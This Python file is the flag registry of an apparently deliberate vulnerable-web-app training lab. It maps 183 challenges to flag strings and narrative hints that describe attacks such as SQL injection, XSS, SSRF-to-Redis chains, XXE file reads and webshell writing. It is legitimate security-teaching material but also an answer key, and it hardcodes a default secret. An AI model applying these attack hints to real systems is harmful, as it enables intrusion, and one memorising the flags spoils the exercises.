"""
flags.py — Central flag registry for The PenTrix
All 183 challenges with meaningful flag names, immersive descriptions,
narrative hints, and multi-challenge linkage.

Design Philosophy:
  "You are in a situation. Achieve an objective."
  Hints feel accidental, not designed.
  Flags reinforce what the player learned.
"""
import hashlib
import os


def generate_flag(flag_id: str, secret: str = None) -> str:
    """
    Generate a meaningful, learning-reinforcing flag for a given challenge.
    Each flag name describes what the player actually discovered/exploited.
    Falls back to HMAC hash if no meaningful name is defined.
    """
    meaningful = MEANINGFUL_FLAGS.get(flag_id)
    if meaningful:
        return meaningful
    # Fallback for any IDs not yet mapped
    if secret is None:
        secret = os.environ.get('FLAG_SECRET', 'pentrix_lab_secret_2024')
    digest = hashlib.sha256(f"{secret}:{flag_id}".encode()).hexdigest()[:16].upper()
    return f"FLAG{{{flag_id.replace('-','_')}_{digest}}}"


# ══════════════════════════════════════════════════════════════════
# MEANINGFUL FLAG VALUES — reinforces what the player learned
# ══════════════════════════════════════════════════════════════════
MEANINGFUL_FLAGS = {
    # ── CH01: Initial Recon — "First Contact" ──
    'CH01-C01': 'flag{hidden_in_plain_sight}',
    'CH01-C02': 'flag{robots_know_the_secrets}',
    'CH01-C03': 'flag{developers_leave_traces}',
    'CH01-C04': 'flag{backup_artifacts_exposed}',
    'CH01-C05': 'flag{fingerprint_the_stack}',
    'CH01-C06': 'flag{sitemap_reveals_structure}',
    'CH01-C07': 'flag{hidden_fields_hidden_data}',
    'CH01-C08': 'flag{decode_the_unreadable}',
    'CH01-C09': 'flag{changelog_tells_history}',
    'CH01-C10': 'flag{debug_mode_in_production}',

    # ── CH02: Fingerprinting — "Know Your Target" ──
    'CH02-C01': 'flag{server_header_leaks_version}',
    'CH02-C02': 'flag{framework_detected_flask}',
    'CH02-C03': 'flag{error_page_reveals_os}',
    'CH02-C04': 'flag{powered_by_information}',
    'CH02-C05': 'flag{database_error_fingerprint}',
    'CH02-C06': 'flag{internal_ip_in_headers}',
    'CH02-C07': 'flag{stacktrace_framework_leak}',
    'CH02-C08': 'flag{version_in_javascript}',
    'CH02-C09': 'flag{meta_generator_exposed}',
    'CH02-C10': 'flag{favicon_hash_fingerprint}',

    # ── CH03: Broken Access Control — "Doors Without Locks" ──
    'CH03-C01': 'flag{idor_profile_access}',
    'CH03-C02': 'flag{read_others_private_mail}',
    'CH03-C03': 'flag{admin_panel_no_auth_check}',
    'CH03-C04': 'flag{horizontal_privilege_escalation}',
    'CH03-C05': 'flag{vertical_escalation_to_admin}',
    'CH03-C06': 'flag{hidden_admin_endpoint_unguarded}',
    'CH03-C07': 'flag{file_download_idor}',
    'CH03-C08': 'flag{api_config_no_authentication}',
    'CH03-C09': 'flag{ticket_idor_data_leak}',
    'CH03-C10': 'flag{mass_assignment_admin_role}',

    # ── CH04: Sensitive Data Exposure — "Secrets in the Open" ──
    'CH04-C01': 'flag{password_in_html_comment}',
    'CH04-C02': 'flag{debug_endpoint_config_dump}',
    'CH04-C03': 'flag{api_key_in_client_js}',
    'CH04-C04': 'flag{dotenv_file_exposed}',
    'CH04-C05': 'flag{credit_card_in_verbose_error}',
    'CH04-C06': 'flag{database_backup_downloadable}',
    'CH04-C07': 'flag{password_hash_in_api_response}',
    'CH04-C08': 'flag{config_json_secrets_leaked}',
    'CH04-C09': 'flag{salary_data_in_javascript}',
    'CH04-C10': 'flag{server_logs_publicly_readable}',

    # ── CH05: Directory Traversal — "Breaking Boundaries" ──
    'CH05-C01': 'flag{traversal_etc_passwd_read}',
    'CH05-C02': 'flag{escaped_webroot_found_flag}',
    'CH05-C03': 'flag{template_path_traversal}',
    'CH05-C04': 'flag{proc_version_via_traversal}',
    'CH05-C05': 'flag{double_encoding_bypass}',
    'CH05-C06': 'flag{null_byte_injection_works}',
    'CH05-C07': 'flag{source_code_via_traversal}',
    'CH05-C08': 'flag{backslash_traversal_path}',
    'CH05-C09': 'flag{ssh_key_exposed_traversal}',
    'CH05-C10': 'flag{zip_slip_path_traversal}',

    # ── CH06: Broken Authentication — "Keys Under the Mat" ──
    'CH06-C01': 'flag{default_credentials_admin}',
    'CH06-C02': 'flag{no_lockout_brute_forced}',
    'CH06-C03': 'flag{predictable_reset_token}',
    'CH06-C04': 'flag{session_fixation_hijack}',
    'CH06-C05': 'flag{empty_password_bypass}',
    'CH06-C06': 'flag{expired_session_still_valid}',
    'CH06-C07': 'flag{remember_me_cookie_forged}',
    'CH06-C08': 'flag{reset_token_never_expires}',
    'CH06-C09': 'flag{username_enumeration_leak}',
    'CH06-C10': 'flag{jwt_algorithm_none_bypass}',

    # ── CH07: Fuzzing — "Mapping the Unknown" ──
    'CH07-C01': 'flag{hidden_endpoint_discovered}',
    'CH07-C02': 'flag{debug_parameter_unlocked}',
    'CH07-C03': 'flag{backup_file_found}',
    'CH07-C04': 'flag{secret_admin_route}',
    'CH07-C05': 'flag{api_version_two_found}',
    'CH07-C06': 'flag{hidden_post_parameter}',
    'CH07-C07': 'flag{internal_status_exposed}',
    'CH07-C08': 'flag{git_directory_exposed}',
    'CH07-C09': 'flag{test_endpoints_still_live}',
    'CH07-C10': 'flag{cookie_parameter_discovered}',

    # ── CH08: XSS — "Injecting Reality" ──
    'CH08-C01': 'flag{reflected_xss_search}',
    'CH08-C02': 'flag{stored_xss_in_comment}',
    'CH08-C03': 'flag{xss_via_display_name}',
    'CH08-C04': 'flag{xss_in_html_attribute}',
    'CH08-C05': 'flag{xss_javascript_context}',
    'CH08-C06': 'flag{xss_filter_bypass}',
    'CH08-C07': 'flag{xss_in_error_reflection}',
    'CH08-C08': 'flag{xss_via_svg_upload}',
    'CH08-C09': 'flag{xss_header_reflection}',
    'CH08-C10': 'flag{xss_in_ticket_subject}',

    # ── CH09: DOM Vulnerabilities — "The Client is Lying" ──
    'CH09-C01': 'flag{dom_xss_hash_fragment}',
    'CH09-C02': 'flag{postmessage_origin_bypass}',
    'CH09-C03': 'flag{open_redirect_exploited}',
    'CH09-C04': 'flag{dom_clobbering_attack}',
    'CH09-C05': 'flag{client_template_injection}',
    'CH09-C06': 'flag{document_write_xss}',
    'CH09-C07': 'flag{innerhtml_xss_injection}',
    'CH09-C08': 'flag{javascript_uri_redirect}',
    'CH09-C09': 'flag{prototype_pollution_exploit}',
    'CH09-C10': 'flag{eval_location_search_rce}',

    # ── CH10: CSRF — "Trust No Request" ──
    'CH10-C01': 'flag{csrf_email_change}',
    'CH10-C02': 'flag{csrf_password_no_reauth}',
    'CH10-C03': 'flag{csrf_via_get_delete}',
    'CH10-C04': 'flag{csrf_message_as_victim}',
    'CH10-C05': 'flag{csrf_promote_to_admin}',
    'CH10-C06': 'flag{csrf_token_not_bound}',
    'CH10-C07': 'flag{csrf_token_deletion_bypass}',
    'CH10-C08': 'flag{csrf_json_no_token}',
    'CH10-C09': 'flag{csrf_referrer_bypass}',
    'CH10-C10': 'flag{csrf_cors_chain}',

    # ── CH11: RCE — "Total Control" ──
    'CH11-C01': 'flag{os_command_injection_ping}',
    'CH11-C02': 'flag{command_injection_filename}',
    'CH11-C03': 'flag{ssti_jinja2_rce}',
    'CH11-C04': 'flag{ssti_email_template}',
    'CH11-C05': 'flag{eval_user_input_rce}',
    'CH11-C06': 'flag{pickle_deserialization_rce}',
    'CH11-C07': 'flag{user_agent_command_injection}',
    'CH11-C08': 'flag{image_resize_injection}',
    'CH11-C09': 'flag{yaml_deserialization_rce}',
    'CH11-C10': 'flag{log_injection_lfi_chain}',

    # ── CH12: Clickjacking — "Invisible Hands" ──
    'CH12-C01': 'flag{login_page_frameable}',
    'CH12-C02': 'flag{password_change_framed}',
    'CH12-C03': 'flag{admin_panel_clickjacked}',
    'CH12-C04': 'flag{xfo_sameorigin_bypass}',
    'CH12-C05': 'flag{transfer_page_frameable}',
    'CH12-C06': 'flag{double_click_hijack}',
    'CH12-C07': 'flag{drag_drop_clickjack}',
    'CH12-C08': 'flag{profile_settings_framed}',
    'CH12-C09': 'flag{clickjacking_csrf_chain}',
    'CH12-C10': 'flag{missing_csp_frame_ancestors}',

    # ── CH13: Insecure Design — "Broken by Design" ──
    'CH13-C01': 'flag{unlimited_coupon_abuse}',
    'CH13-C02': 'flag{negative_transfer_exploit}',
    'CH13-C03': 'flag{race_condition_signup}',
    'CH13-C04': 'flag{email_verification_skipped}',
    'CH13-C05': 'flag{report_export_data_leak}',
    'CH13-C06': 'flag{sequential_id_prediction}',
    'CH13-C07': 'flag{client_side_age_bypass}',
    'CH13-C08': 'flag{self_approval_exploit}',
    'CH13-C09': 'flag{no_rate_limit_enumeration}',
    'CH13-C10': 'flag{client_filetype_bypass}',

    # ── CH14: API Vulnerabilities — "The Machine Speaks" ──
    'CH14-C01': 'flag{api_no_auth_required}',
    'CH14-C02': 'flag{api_key_in_public_js}',
    'CH14-C03': 'flag{api_mass_assignment}',
    'CH14-C04': 'flag{api_excessive_data_exposure}',
    'CH14-C05': 'flag{api_idor_user_data}',
    'CH14-C06': 'flag{api_broken_object_auth}',
    'CH14-C07': 'flag{deprecated_api_v1_active}',
    'CH14-C08': 'flag{graphql_introspection_leak}',
    'CH14-C09': 'flag{rate_limit_header_bypass}',
    'CH14-C10': 'flag{api_json_injection_privesc}',

    # ── CH15: CORS Misconfiguration — "Trusted by Mistake" ──
    'CH15-C01': 'flag{cors_wildcard_data_theft}',
    'CH15-C02': 'flag{cors_origin_reflection}',
    'CH15-C03': 'flag{cors_null_origin_exploit}',
    'CH15-C04': 'flag{cors_credentials_with_star}',
    'CH15-C05': 'flag{cors_subdomain_trust}',
    'CH15-C06': 'flag{cors_csrf_data_steal}',
    'CH15-C07': 'flag{cors_preflight_bypass}',
    'CH15-C08': 'flag{cors_internal_api_exposed}',
    'CH15-C09': 'flag{cors_origin_whitelist_bypass}',
    'CH15-C10': 'flag{cors_export_misconfigured}',

    # ── CH16: SQL Injection — "Speaking the Database's Language" ──
    'CH16-C01': 'flag{sqli_login_bypass}',
    'CH16-C02': 'flag{sqli_union_table_names}',
    'CH16-C03': 'flag{sqli_union_users_dump}',
    'CH16-C04': 'flag{sqli_error_based_extraction}',
    'CH16-C05': 'flag{blind_sqli_boolean_based}',
    'CH16-C06': 'flag{blind_sqli_time_based}',
    'CH16-C07': 'flag{second_order_sqli}',
    'CH16-C08': 'flag{sqli_order_by_injection}',
    'CH16-C09': 'flag{sqli_read_system_files}',
    'CH16-C10': 'flag{sqli_webshell_written}',

    # ── BONUS: SSRF — "Reaching the Unreachable" ──
    'BONUS-SSRF-C01': 'flag{ssrf_localhost_internal}',
    'BONUS-SSRF-C02': 'flag{ssrf_metadata_service}',
    'BONUS-SSRF-C03': 'flag{ssrf_url_import_feature}',
    'BONUS-SSRF-C04': 'flag{blind_ssrf_webhook}',
    'BONUS-SSRF-C05': 'flag{ssrf_ip_encoding_bypass}',
    'BONUS-SSRF-C06': 'flag{ssrf_file_protocol_read}',
    'BONUS-SSRF-C07': 'flag{ssrf_redis_exploitation}',
    'BONUS-SSRF-C08': 'flag{ssrf_dns_rebinding}',
    'BONUS-SSRF-C09': 'flag{ssrf_admin_internal_port}',
    'BONUS-SSRF-C10': 'flag{ssrf_rce_chain_complete}',

    # ── BONUS: XXE — "The XML Weapon" ──
    'BONUS-XXE-C01': 'flag{xxe_classic_file_read}',
    'BONUS-XXE-C02': 'flag{xxe_svg_upload_attack}',
    'BONUS-XXE-C03': 'flag{xxe_xlsx_import_exploit}',
    'BONUS-XXE-C04': 'flag{xxe_blind_oob_exfil}',
    'BONUS-XXE-C05': 'flag{xxe_ssrf_chain}',
    'BONUS-XXE-C06': 'flag{xxe_parameter_entities}',
    'BONUS-XXE-C07': 'flag{xxe_error_based_exfil}',
    'BONUS-XXE-C08': 'flag{xxe_soap_endpoint}',
    'BONUS-XXE-C09': 'flag{xinclude_injection}',
    'BONUS-XXE-C10': 'flag{xxe_billion_laughs_dos}',

    # ── SCENARIO FLAGS ──
    'SCENARIO-A': 'flag{insider_threat_complete}',
    'SCENARIO-B': 'flag{data_heist_accomplished}',
    'SCENARIO-C': 'flag{full_compromise_achieved}',
}


# ══════════════════════════════════════════════════════════════════
# MASTER FLAG TABLE — Immersive challenge descriptions
# "You are in a situation. Achieve an objective."
# ══════════════════════════════════════════════════════════════════
FLAGS = {
    # ═══ Chapter 1 — Initial Recon: "First Contact" ═══
    # You have discovered the public-facing portal of PenTrix Corp.
    # Your objective is to map the attack surface and identify weak
    # entry points without triggering suspicion.
    'CH01-C01': 'An entry point was unintentionally exposed in plain sight. Find a way in.',
    'CH01-C02': 'The application attempts to guide automated visitors. Follow the trail it leaves behind.',
    'CH01-C03': 'Developers often leave traces during development. Recover anything they forgot to remove.',
    'CH01-C04': 'Old deployment artifacts sometimes remain accessible. Locate something that shouldn\'t still be public.',
    'CH01-C05': 'Before attacking, understand your target. Identify what powers this application.',
    'CH01-C06': 'Applications often reveal their structure indirectly. Use this to map hidden areas.',
    'CH01-C07': 'Client-side data cannot always be trusted. Manipulate what you find to uncover hidden information.',
    'CH01-C08': 'Not all data is meant to be readable at first glance. Transform what you find.',
    'CH01-C09': 'Historical records can expose valuable insights about a system\'s evolution. Locate such an endpoint.',
    'CH01-C10': 'Development features sometimes remain enabled in production. Find one and exploit it.',

    # ═══ Chapter 2 — Fingerprinting: "Know Your Target" ═══
    # PenTrix Corp\'s portal is live. Before launching any attack,
    # a professional maps every technology detail. The more you know,
    # the more precisely you can strike.
    'CH02-C01': 'Every server announces itself if you know where to listen. Extract its identity.',
    'CH02-C02': 'The framework powering this portal left breadcrumbs. Identify the exact technology and version.',
    'CH02-C03': 'When systems break, they sometimes confess what they\'re running on. Provoke a failure.',
    'CH02-C04': 'Some applications proudly declare what powers them. Find this declaration.',
    'CH02-C05': 'Databases speak different dialects. Trigger an error that reveals which one is behind the scenes.',
    'CH02-C06': 'Network boundaries blur when servers leak internal addresses. Find one hiding in the response.',
    'CH02-C07': 'A catastrophic failure reveals the full technical fingerprint. Cause one, carefully.',
    'CH02-C08': 'Client-side files often contain versioning metadata. Examine what the browser downloads.',
    'CH02-C09': 'Web pages carry invisible labels. Find the one that identifies the content management system.',
    'CH02-C10': 'Every framework has a unique visual signature. Identify it without looking at a single line of code.',

    # ═══ Chapter 3 — Broken Access Control: "Doors Without Locks" ═══
    # You\'ve gained a legitimate low-level account. But the access
    # boundaries are poorly enforced. See how far you can reach
    # beyond what you\'re supposed to access.
    'CH03-C01': 'Your profile has an ID. What happens if that ID belongs to someone else?',
    'CH03-C02': 'Private messages are supposed to be... private. Verify that assumption.',
    'CH03-C03': 'An administrative dashboard exists. The question is: does it actually verify who\'s knocking?',
    'CH03-C04': 'You can edit your own content. But what if you edit someone else\'s? Test the boundary.',
    'CH03-C05': 'Regular users have limited power. But what if you could tell the system you deserve more?',
    'CH03-C06': 'Some management endpoints exist but aren\'t listed in navigation. They might still respond.',
    'CH03-C07': 'Files belong to their uploaders — or do they? Test whether ownership is actually enforced.',
    'CH03-C08': 'Internal API configuration should require elevated access. Does it?',
    'CH03-C09': 'Support tickets contain sensitive conversations. Check if the walls between them are real.',
    'CH03-C10': 'During account creation, the system decides what you are. What if you make that decision instead?',

    # ═══ Chapter 4 — Sensitive Data Exposure: "Secrets in the Open" ═══
    # PenTrix Corp stores critical data — credentials, financial records,
    # internal configs. How much of it can you access without ever
    # needing to exploit a vulnerability? Sometimes they just... leave it there.
    'CH04-C01': 'Someone left a sensitive credential where anyone could read it. Start with the page source.',
    'CH04-C02': 'A development tool was never disabled. It reveals everything about how this system is configured.',
    'CH04-C03': 'API keys should be server-side only. This one ended up in a place any browser can see.',
    'CH04-C04': 'A configuration file commonly used during development is sitting in the web root. Access it.',
    'CH04-C05': 'When the application encounters unusual data, it panics loudly — revealing financial information.',
    'CH04-C06': 'The database was backed up. The backup was forgotten. It\'s still sitting where you can grab it.',
    'CH04-C07': 'An API returns user data. But it returns too much data — including things it really shouldn\'t.',
    'CH04-C08': 'Application settings were exported to a common format. The file is still accessible.',
    'CH04-C09': 'Business-critical salary information was inadvertently embedded in client-side code.',
    'CH04-C10': 'Server logs are a goldmine of information. And these logs have no access restrictions.',

    # ═══ Chapter 5 — Directory Traversal: "Breaking Boundaries" ═══
    # The file system is a locked building, and you\'re on the ground floor.
    # But some doors use paths instead of keys — and paths can be... extended.
    'CH05-C01': 'The file download feature trusts your input. Convince it to read something it shouldn\'t.',
    'CH05-C02': 'A flag file exists outside the intended directory. Navigate the file system to reach it.',
    'CH05-C03': 'Template inclusion accepts user-controlled paths. Direct it somewhere unexpected.',
    'CH05-C04': 'The operating system keeps records about itself. Read one through the application.',
    'CH05-C05': 'Basic traversal filters are in place. But they don\'t account for double encoding.',
    'CH05-C06': 'Some string operations terminate early at unexpected characters. Exploit this behavior.',
    'CH05-C07': 'The application\'s own source code is one of the most valuable things you can read. Get it.',
    'CH05-C08': 'Path separators vary between operating systems. Use the alternative notation.',
    'CH05-C09': 'Cryptographic keys grant access everywhere. Locate one stored on the file system.',
    'CH05-C10': 'Archive extraction doesn\'t validate filenames. Craft one that writes outside the intended directory.',

    # ═══ Chapter 6 — Broken Authentication: "Keys Under the Mat" ═══
    # Authentication is the front door. PenTrix Corp\'s front door
    # has several known weaknesses. Find each one and walk through.
    'CH06-C01': 'The administrator account uses the same credentials it was deployed with. Try the obvious.',
    'CH06-C02': 'There\'s no penalty for guessing wrong. Try as many times as you need.',
    'CH06-C03': 'Password recovery generates a token. But the token follows a recognizable pattern.',
    'CH06-C04': 'What if you set your own session identifier before authenticating?',
    'CH06-C05': 'Authentication logic has edge cases. What happens when you submit... nothing?',
    'CH06-C06': 'Sessions should end. This one doesn\'t. Retrieve an old token and try again.',
    'CH06-C07': 'The "remember me" feature stores something predictable. Forge it.',
    'CH06-C08': 'A password reset token was used — but the system forgot to invalidate it.',
    'CH06-C09': 'The login page responds differently depending on whether the username exists. Exploit the difference.',
    'CH06-C10': 'A JSON Web Token protects access. But its algorithm can be set to "none".',

    # ═══ Chapter 7 — Fuzzing: "Mapping the Unknown" ═══
    # The visible surface is only the beginning. Beneath the
    # navigation lies an entire hidden landscape of forgotten
    # endpoints, debug tools, and backup artifacts.
    'CH07-C01': 'There are pages not linked from anywhere in the navigation. Find one that was meant to be secret.',
    'CH07-C02': 'A hidden parameter activates functionality the developers thought only they knew about.',
    'CH07-C03': 'Before deployment, someone made a backup. They forgot to remove it. It\'s still here.',
    'CH07-C04': 'An alternate administrative interface exists at an unconventional path.',
    'CH07-C05': 'The API has been updated. But the old version still responds to requests.',
    'CH07-C06': 'A form accepts more parameters than it shows. Submit a field it doesn\'t advertise.',
    'CH07-C07': 'Internal monitoring pages are running. They were never restricted to internal networks.',
    'CH07-C08': 'Version control metadata was deployed alongside the application. The entire history is readable.',
    'CH07-C09': 'Testing endpoints were created during development. They survived into production.',
    'CH07-C10': 'A cookie name hides a secondary function. Discover what it controls.',

    # ═══ Chapter 8 — XSS: "Injecting Reality" ═══
    # The portal accepts user input in many places. But not all input
    # is sanitized before it\'s rendered. Make the application execute
    # code it never intended to run.
    'CH08-C01': 'Search results reflect your query back to you. But do they sanitize it first?',
    'CH08-C02': 'Comments are displayed to every reader. What if a comment contains executable code?',
    'CH08-C03': 'Your display name appears on every post you make. Other users will see exactly what you set.',
    'CH08-C04': 'Your input lands inside an HTML attribute. Escape the attribute to execute code.',
    'CH08-C05': 'Your input is placed inside a JavaScript block. Break out of the string context.',
    'CH08-C06': 'A basic tag filter blocks obvious payloads. Find an alternative vector it doesn\'t catch.',
    'CH08-C07': 'Error messages include your input verbatim. The error page doesn\'t sanitize it.',
    'CH08-C08': 'Image uploads accept SVG format. SVG is XML — and XML can do more than display images.',
    'CH08-C09': 'An HTTP header value is reflected in the page body. Inject through the header.',
    'CH08-C10': 'Support tickets are reviewed by staff. Their viewer doesn\'t sanitize the subject line.',

    # ═══ Chapter 9 — DOM Vulnerabilities: "The Client is Lying" ═══
    # Server-side security means nothing if the client-side code
    # is vulnerable. These challenges live entirely in the browser.
    'CH09-C01': 'The URL fragment is read by JavaScript and written to the page. Control what gets rendered.',
    'CH09-C02': 'A cross-window message listener exists. It doesn\'t verify who sent the message.',
    'CH09-C03': 'A redirect parameter exists. It accepts any destination — including ones you control.',
    'CH09-C04': 'Named HTML elements can override JavaScript variables. Exploit this naming collision.',
    'CH09-C05': 'A client-side template engine evaluates expressions. Special syntax becomes code execution.',
    'CH09-C06': 'User input flows into document.write(). The page renders whatever you provide.',
    'CH09-C07': 'An element\'s innerHTML is set from user-controlled data. Inject a payload through it.',
    'CH09-C08': 'A redirect accepts javascript: URIs. The browser will execute them.',
    'CH09-C09': 'Object prototype can be polluted through a merge function. Alter the behavior of all objects.',
    'CH09-C10': 'URL search parameters are evaluated as code. Control the parameter, control the execution.',

    # ═══ Chapter 10 — CSRF: "Trust No Request" ═══
    # The application trusts that requests come from the legitimate user.
    # Prove that any website can make these requests on the user\'s behalf.
    'CH10-C01': 'Email changes don\'t verify the request origin. Change someone\'s email from an external page.',
    'CH10-C02': 'Passwords can be changed without entering the current one. Forge this request externally.',
    'CH10-C03': 'Account deletion happens via GET request. A single link click triggers it.',
    'CH10-C04': 'Messages are posted without origin verification. Post as someone else from your own site.',
    'CH10-C05': 'Role promotion has no CSRF protection. Elevate privileges with a forged request.',
    'CH10-C06': 'CSRF tokens exist but aren\'t tied to the session. Use any valid token from any session.',
    'CH10-C07': 'The server validates the CSRF token — but only when one is present. Remove it entirely.',
    'CH10-C08': 'JSON API endpoints skip CSRF checks. Submit a cross-origin JSON request.',
    'CH10-C09': 'Referrer-based CSRF protection can be bypassed. Find a way to suppress the header.',
    'CH10-C10': 'CORS and CSRF combine into a powerful chain. Steal data cross-origin.',

    # ═══ Chapter 11 — RCE: "Total Control" ═══
    # The ultimate goal: execute arbitrary commands on the server.
    # These vulnerabilities give you operating system-level access.
    'CH11-C01': 'A network diagnostic tool passes your input directly to the operating system. Add your own command.',
    'CH11-C02': 'A filename parameter reaches a system command. Inject through the name itself.',
    'CH11-C03': 'The template engine evaluates user input. Craft an expression that executes server-side code.',
    'CH11-C04': 'Email templates use dynamic rendering. The template syntax is your entry point.',
    'CH11-C05': 'A calculator feature uses eval() on your input. Math isn\'t the only thing it can compute.',
    'CH11-C06': 'Serialized data is loaded without validation. Craft a payload that executes on deserialization.',
    'CH11-C07': 'The User-Agent header is processed server-side — through a system command.',
    'CH11-C08': 'Image dimensions are passed to a command-line tool. Inject through the parameters.',
    'CH11-C09': 'YAML configuration is loaded from user input. YAML supports code execution.',
    'CH11-C10': 'Inject code into the server log. Then read the log through file inclusion. Chain complete.',

    # ═══ Chapter 12 — Clickjacking: "Invisible Hands" ═══
    # The application can be framed. An attacker can overlay invisible
    # actions on top of legitimate-looking content. The user clicks
    # what they see — but triggers what the attacker wants.
    'CH12-C01': 'The login page has no framing protection. Embed it in your own page.',
    'CH12-C02': 'The password change form can be loaded in a frame. Trick a user into changing their password.',
    'CH12-C03': 'The admin panel lacks frame-busting headers. Overlay it with deceptive content.',
    'CH12-C04': 'X-Frame-Options allows SAMEORIGIN — but subdomains might also qualify.',
    'CH12-C05': 'A fund transfer page can be framed. Make a user approve a transaction unknowingly.',
    'CH12-C06': 'A double-click interaction can be hijacked. The first click sets up, the second triggers.',
    'CH12-C07': 'Drag-and-drop interactions can be exploited across frame boundaries.',
    'CH12-C08': 'Profile settings are frameable. An attacker can make a user change their own settings.',
    'CH12-C09': 'Clickjacking plus missing CSRF protection equals a powerful combo attack.',
    'CH12-C10': 'CSP frame-ancestors is the modern protection. This application doesn\'t set it.',

    # ═══ Chapter 13 — Insecure Design: "Broken by Design" ═══
    # These aren\'t implementation bugs — they\'re architectural flaws.
    # The logic itself is wrong, and no amount of input validation
    # can fix what was designed incorrectly.
    'CH13-C01': 'A discount coupon works — again and again and again. There\'s no usage limit enforced.',
    'CH13-C02': 'Transfer money between accounts. But what happens when the amount is negative?',
    'CH13-C03': 'Registration is meant to enforce unique usernames. But what if two requests arrive simultaneously?',
    'CH13-C04': 'Email verification is a required step. But the application doesn\'t enforce the sequence.',
    'CH13-C05': 'Data exports reveal more than the user is authorized to see.',
    'CH13-C06': 'User IDs are assigned sequentially. Predict the next one before the account exists.',
    'CH13-C07': 'Age verification happens in the browser. The server never double-checks.',
    'CH13-C08': 'You submitted a request for approval. Now approve it yourself.',
    'CH13-C09': 'Email existence checks have no rate limit. Enumerate every address in the system.',
    'CH13-C10': 'File type validation runs in JavaScript only. The server accepts whatever you send.',

    # ═══ Chapter 14 — API Vulnerabilities: "The Machine Speaks" ═══
    # The REST API powers everything behind the scenes. It was built
    # for speed, not security. Every endpoint is a potential attack vector.
    'CH14-C01': 'An API endpoint returns user data without requiring authentication. Just ask.',
    'CH14-C02': 'An API key was hardcoded into the client-side JavaScript. Now everyone has it.',
    'CH14-C03': 'The API accepts fields you\'re not supposed to set. Include an admin role in your request.',
    'CH14-C04': 'User profile API returns every column from the database. Including the sensitive ones.',
    'CH14-C05': 'API resources are accessed by ID. Change the ID to access another user\'s data.',
    'CH14-C06': 'The PATCH endpoint lets you modify any user — not just yourself.',
    'CH14-C07': 'API version 1 had weaker security controls. It\'s still accessible.',
    'CH14-C08': 'GraphQL introspection is enabled. Query the entire schema to reveal hidden operations.',
    'CH14-C09': 'Rate limiting is enforced per IP. But the IP can be overridden with a header.',
    'CH14-C10': 'JSON request bodies can be injected to escalate your privileges.',

    # ═══ Chapter 15 — CORS Misconfiguration: "Trusted by Mistake" ═══
    # Cross-Origin Resource Sharing decides who can read your responses.
    # When it\'s misconfigured, any website in the world can steal your data.
    'CH15-C01': 'The Access-Control-Allow-Origin header is set to *. Every site on the internet is trusted.',
    'CH15-C02': 'The server reflects whatever Origin you send. It trusts everyone who asks.',
    'CH15-C03': 'The null origin is in the allow list. Sandboxed iframes send exactly that.',
    'CH15-C04': 'Credentials are sent with wildcard CORS. Cookies travel to any requesting origin.',
    'CH15-C05': 'Subdomains are implicitly trusted. XSS on any subdomain exploits this trust.',
    'CH15-C06': 'CORS allows reading the response. Combined with CSRF, data can be exfiltrated.',
    'CH15-C07': 'Simple requests skip the pre-flight check. This opens a direct attack path.',
    'CH15-C08': 'An internal API endpoint has permissive CORS. External sites can read internal data.',
    'CH15-C09': 'The origin whitelist has a flaw in its validation logic. Bypass it.',
    'CH15-C10': 'A private data export endpoint allows cross-origin access. Exfiltrate the data.',

    # ═══ Chapter 16 — SQL Injection: "Speaking the Database\'s Language" ═══
    # The database executes whatever it\'s told. The application builds
    # its commands from your input. Speak SQL, and the database will obey.
    'CH16-C01': 'The login form builds its query from your input. Bypass the password check entirely.',
    'CH16-C02': 'Append a UNION query to extract the schema. Discover what tables exist.',
    'CH16-C03': 'Now that you know the tables, extract every username and password.',
    'CH16-C04': 'An error message includes the SQL error detail. Extract data through error messages.',
    'CH16-C05': 'No error, no output — but the behavior changes. Extract data one bit at a time.',
    'CH16-C06': 'Timing is information. Make the database pause to confirm your hypothesis.',
    'CH16-C07': 'Your data is stored, then used in another query later. The injection fires on the second use.',
    'CH16-C08': 'The sort order is controlled by user input — and it reaches the ORDER BY clause directly.',
    'CH16-C09': 'SQLite has functions that read the file system. Use SQL to read OS files.',
    'CH16-C10': 'Write a file to the web directory through SQL. A webshell, perhaps.',

    # ═══ BONUS — SSRF: "Reaching the Unreachable" ═══
    # Internal services are hidden behind the firewall. But the
    # application server sits inside that firewall. Make it fetch
    # what you can\'t reach directly.
    'BONUS-SSRF-C01': 'A URL fetch feature exists. Point it at localhost to reach an internal service.',
    'BONUS-SSRF-C02': 'Cloud metadata endpoints expose secrets about the infrastructure. Reach one via SSRF.',
    'BONUS-SSRF-C03': 'An import feature fetches remote URLs. Redirect it to an internal target.',
    'BONUS-SSRF-C04': 'A webhook feature makes outbound requests. Capture and analyze what it sends.',
    'BONUS-SSRF-C05': 'IP filters block 127.0.0.1 — but there are many ways to represent the loopback address.',
    'BONUS-SSRF-C06': 'Switch the protocol from HTTP to file://. The application reads the local filesystem.',
    'BONUS-SSRF-C07': 'Redis listens on an internal port. Use SSRF to send it commands.',
    'BONUS-SSRF-C08': 'DNS rebinding resolves to an internal IP after the filter check passes.',
    'BONUS-SSRF-C09': 'An admin panel runs on an internal-only port. Access it through the application.',
    'BONUS-SSRF-C10': 'Chain SSRF into Redis, then Redis into code execution. The full kill chain.',

    # ═══ BONUS — XXE: "The XML Weapon" ═══
    # XML is more powerful than it appears. External entities can
    # read files, make network requests, and crash the server.
    # The parser trusts the document — you control the document.
    'BONUS-XXE-C01': 'Submit XML with an external entity pointing to /etc/passwd. The parser will read it.',
    'BONUS-XXE-C02': 'SVG files are XML. Upload one with an entity declaration — the parser processes it.',
    'BONUS-XXE-C03': 'XLSX files contain XML internally. Modify the XML to include malicious entities.',
    'BONUS-XXE-C04': 'The server doesn\'t reflect entity values. Exfiltrate data through DNS or HTTP callbacks.',
    'BONUS-XXE-C05': 'External entities can make HTTP requests. Use XXE to perform an SSRF attack.',
    'BONUS-XXE-C06': 'Parameter entities work in the DTD context. Use them to bypass general entity restrictions.',
    'BONUS-XXE-C07': 'Force an error that includes the entity value. The error message becomes your data channel.',
    'BONUS-XXE-C08': 'SOAP services parse XML requests. Inject entities into the SOAP body.',
    'BONUS-XXE-C09': 'XInclude provides an alternative inclusion mechanism. No DTD declaration needed.',
    'BONUS-XXE-C10': 'Recursive entity expansion consumes exponential memory. Crash the parser.',

    # ═══ SCENARIO FLAGS ═══
    'SCENARIO-A': 'Scenario A: The Insider — Total lateral movement from user to admin.',
    'SCENARIO-B': 'Scenario B: Data Heist — Full data exfiltration as an outsider.',
    'SCENARIO-C': 'Scenario C: Full Compromise — Remote code execution from zero knowledge.',
}

# Pre-generate all flags using meaningful names
